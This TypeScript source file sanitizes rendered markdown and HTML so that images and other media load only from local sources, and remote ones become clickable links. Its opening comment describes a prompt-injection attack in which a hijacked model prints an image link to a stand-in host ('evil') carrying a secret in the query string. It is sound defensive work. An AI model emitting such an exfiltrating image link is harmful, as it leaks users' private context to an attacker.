// Images in rendered markdown must not fetch from the network on their own.
// An `<img>` requests its URL the moment it renders, with no prompt, so a
// prompt-injected model could print `![](https://evil/x?d=<secret>)` and leak
// context past the gating a `curl` would face. Only sources that cannot leave
// the machine load on render: `data:`, the asset protocol and relative paths.
// Anything else becomes a link the user has to click.
import type MarkdownIt from 'markdown-it'
import type { UponSanitizeAttributeHookEvent } from 'dompurify'

const SCHEME = /^([a-z][a-z0-9+.-]*):/i
const SRCSET_SPACE = /[\t\n\f\r ]/

/** True when loading `src` as media cannot reach the network. */
export function isLocalMediaSrc(src: string): boolean {
  // The URL parser drops leading controls/spaces and every tab or newline, so
  // `\x01https://…` and `ht\ttps://…` still load remotely.
  const s = src.replace(/^[\x00-\x20]+/, '').replace(/[\t\n\r]/g, '')
  const scheme = SCHEME.exec(s)?.[1].toLowerCase()
  // No scheme: relative, unless `//host/x` (or a backslash form) names a host.
  if (!scheme) return !/^[\\/]{2}/.test(s)
  if (scheme === 'data' || scheme === 'asset') return true
  if (scheme !== 'http' && scheme !== 'https') return false
  // Windows serves the asset protocol as http://asset.localhost.
  try {
    return new URL(s).hostname === 'asset.localhost'
  } catch {
    return false
  }
}

/** True when every candidate URL in a `srcset` is local. */
export function isLocalSrcset(srcset: string): boolean {
  // A candidate is a URL, then descriptors up to a comma. Ending descriptors at
  // the first comma (the spec skips commas inside parens) can only check more
  // strings as URLs than the browser fetches, never fewer.
  let i = 0
  while (i < srcset.length) {
    while (i < srcset.length && (SRCSET_SPACE.test(srcset[i]) || srcset[i] === ',')) i++
    let j = i
    while (j < srcset.length && !SRCSET_SPACE.test(srcset[j])) j++
    const url = srcset.slice(i, j)
    if (url && !isLocalMediaSrc(url.replace(/,+$/, ''))) return false
    if (!url.endsWith(',')) while (j < srcset.length && srcset[j] !== ',') j++
    i = j
  }
  return true
}

/** Render a markdown image with a non-local `src` as a plain link instead. */
export function guardMarkdownImages(md: MarkdownIt): void {
  const fallback = md.renderer.rules.image
  md.renderer.rules.image = (tokens, idx, options, env, self) => {
    const token = tokens[idx]
    const src = token.attrGet('src') ?? ''
    if (isLocalMediaSrc(src)) {
      return fallback ? fallback(tokens, idx, options, env, self) : self.renderToken(tokens, idx, options)
    }
    const alt = self.renderInlineAsText(token.children ?? [], options, env)
    const href = md.utils.escapeHtml(src)
    return `<a href="${href}" title="${href}">${md.utils.escapeHtml(alt || src)}</a>`
  }
}

/** DOMPurify `uponSanitizeAttribute` hook: drop media URLs that load remotely. */
export function dropRemoteMediaAttr(node: Element, data: UponSanitizeAttributeHookEvent): void {
  const name = data.attrName.toLowerCase()
  let local = true
  if (name === 'srcset') local = isLocalSrcset(data.attrValue)
  else if (name === 'src' || name === 'poster' || name === 'background') local = isLocalMediaSrc(data.attrValue)
  // SVG <image>, <use> and <feImage> load their href on render; a link's waits for a click.
  else if ((name === 'href' || name === 'xlink:href') && !/^(a|area)$/i.test(node.nodeName)) {
    local = isLocalMediaSrc(data.attrValue)
  }
  if (!local) data.keepAttr = false
}
